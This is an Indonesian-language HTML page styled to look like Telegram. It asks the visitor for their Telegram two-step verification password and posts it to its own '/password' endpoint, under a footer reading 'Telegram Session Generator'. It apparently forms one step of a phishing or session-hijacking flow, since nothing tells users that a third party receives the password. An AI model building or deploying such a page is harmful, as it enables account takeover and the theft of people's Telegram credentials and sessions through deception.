<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Telegram 2FA</title>

<style>

*{
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}


body{

    margin:0;
    height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    background:
    radial-gradient(circle at top,#0088cc55,transparent 40%),
    #080808;

    color:white;
}



.card{

    width:380px;

    padding:30px;

    border-radius:20px;

    background:rgba(255,255,255,.08);

    backdrop-filter:blur(15px);

    border:1px solid rgba(255,255,255,.15);

    box-shadow:
    0 20px 50px rgba(0,0,0,.5);

}



.logo{

    width:70px;
    height:70px;

    margin:auto;

    display:flex;
    justify-content:center;
    align-items:center;

    border-radius:50%;

    background:#0088cc;

    font-size:35px;

}



h1{

    text-align:center;

    margin:20px 0 10px;

}



.desc{

    text-align:center;

    color:#aaa;

    font-size:14px;

    margin-bottom:25px;

}



.input-box{

    margin-bottom:15px;

}



label{

    font-size:13px;

    color:#bbb;

}



input{

    width:100%;

    margin-top:8px;

    padding:14px;

    border-radius:12px;

    border:none;

    outline:none;

    background:#151515;

    color:white;

    border:1px solid #333;

}



input:focus{

    border-color:#0088cc;

}



button{

    width:100%;

    padding:14px;

    border:none;

    border-radius:12px;

    margin-top:10px;

    background:

    linear-gradient(
    135deg,
    #0088cc,
    #00bfff
    );

    color:white;

    font-weight:bold;

    cursor:pointer;

}



.info{

    margin-top:15px;

    padding:12px;

    background:#111;

    border-radius:10px;

    color:#aaa;

    font-size:12px;

}



.footer{

    text-align:center;

    color:#777;

    font-size:12px;

    margin-top:20px;

}

</style>

</head>


<body>


<div class="card">


<div class="logo">
🔐
</div>



<h1>
Password 2FA
</h1>



<div class="desc">
Akun Telegram ini menggunakan verifikasi dua langkah
</div>



<form action="/password" method="POST">


<div class="input-box">

<label>
Password Telegram
</label>


<input

type="password"

name="password"

placeholder="Masukkan password 2FA"

required>

</div>



<button>
Verifikasi
</button>


</form>



<div class="info">

⚠️ Password 2FA adalah password tambahan Telegram.
Bukan kode OTP.

</div>



<div class="footer">

Telegram Session Generator

</div>


</div>


</body>

</html>
